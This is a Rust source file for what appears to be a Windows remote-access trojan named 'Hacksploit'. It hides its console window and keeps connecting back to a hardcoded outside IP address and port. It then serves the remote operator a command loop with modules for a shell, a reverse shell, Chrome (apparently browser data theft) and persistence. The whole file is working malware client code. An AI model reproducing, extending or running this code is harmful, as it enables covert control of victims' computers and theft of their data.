use modules::{
    chrome::ChromeModule, persistence::PersistenceModule, reverse_shell::ReverseShellModule,
    shell::ShellModule, spawn_instance::SpawnInstanceModule,
};
use std::boxed::Box;
use std::io::{Error, Read, Write};
use std::net::TcpStream;
use winapi::um::wincon::GetConsoleWindow;
use winapi::um::winuser::{ShowWindow, SW_HIDE};

mod modules;

const WELCOME_MESSAGE: &str = "Welcome to Hacksploit :)\n";
const HELP_MESSAGE: &str = "\nCommand entries: \n{ENTRIES}\n";
const UNKNOWN_COMMAND: &str = "Unknown command. Please try again.\n";

const DEFAULT_ADDR: &str = "51.146.6.229:1337";

pub trait HacksploitModule {
    fn on_command(&self, args: Vec<&str>) -> String;
    fn get_name(&self) -> String;
    fn get_description(&self) -> String;
}

pub struct HacksploitInstance {
    modules: Vec<Box<dyn HacksploitModule>>,
    welcome_message: String,
    help_message: String,
}

impl HacksploitInstance {
    pub fn new() -> Self {
        HacksploitInstance {
            modules: vec![],
            welcome_message: String::from(WELCOME_MESSAGE),
            help_message: String::from(HELP_MESSAGE),
        }
    }

    pub fn register_module<T>(&mut self, module: T)
    where
        T: HacksploitModule + 'static,
    {
        self.modules.push(Box::new(module));
    }

    fn on_command(&self, data: String) -> String {
        let arr: Vec<&str> = data.split_whitespace().collect();
        let command = arr.get(0);
        if command.is_none() {
            return String::new();
        }
        let command = command.unwrap();
        let args = arr[1..].to_vec();
        for module in &self.modules {
            if command.eq_ignore_ascii_case(&module.get_name()) {
                return module.on_command(args);
            }
        }
        String::new()
    }

    fn get_welcome_message(&self) -> String {
        String::from(&self.welcome_message)
    }

    fn get_help_message(&self) -> String {
        let mut entries: Vec<String> = vec![];
        for module in &self.modules {
            let entry_text = vec![
                "->",
                module.get_name().as_str(),
                "-",
                module.get_description().as_str(),
            ]
            .join(" ");
            entries.push(entry_text);
        }
        let entries = entries.join("\n");
        String::from(&self.help_message.replace("{ENTRIES}", &entries))
    }
}

fn hide_console_window() {
    unsafe {
        let window = GetConsoleWindow();
        if window != std::ptr::null_mut() {
            ShowWindow(window, SW_HIDE);
        }
    }
}

fn main() {
    hide_console_window();
    let interval = std::time::Duration::from_secs(1);
    let mut addr = String::from(DEFAULT_ADDR);
    if std::env::args().len() > 1 {
        addr = std::env::args().nth(1).unwrap();
    }
    println!("{}", addr);
    loop {
        match start(&addr) {
            Ok(_) => (),
            Err(_) => (),
        }
        std::thread::sleep(interval);
    }
}

fn start(addr: &str) -> Result<(), Error> {
    let mut stream: TcpStream = TcpStream::connect(addr)?;
    let mut instance: HacksploitInstance = HacksploitInstance::new();
    register_modules(&mut instance);
    stream.write(instance.get_welcome_message().as_bytes())?;
    stream.flush()?;
    loop {
        let mut buf = [0; 1024];

        stream.write(instance.get_help_message().as_bytes())?;
        stream.flush()?;

        let len = stream.read(&mut buf)?;
        if len == 0 {
            break;
        }
        let data = String::from_utf8(buf[..len].to_vec());
        match data {
            Ok(data) => {
                let mut response = instance.on_command(data);
                if response.len() == 0 {
                    response = String::from(UNKNOWN_COMMAND);
                }
                stream.write(response.as_bytes())?;
                stream.flush()?;
            }
            Err(_) => break,
        }
    }
    Ok(())
}

fn register_modules(instance: &mut HacksploitInstance) {
    instance.register_module(ShellModule::new());
    instance.register_module(ReverseShellModule::new());
    instance.register_module(ChromeModule::new());
    instance.register_module(PersistenceModule::new());
    instance.register_module(SpawnInstanceModule::new());
}
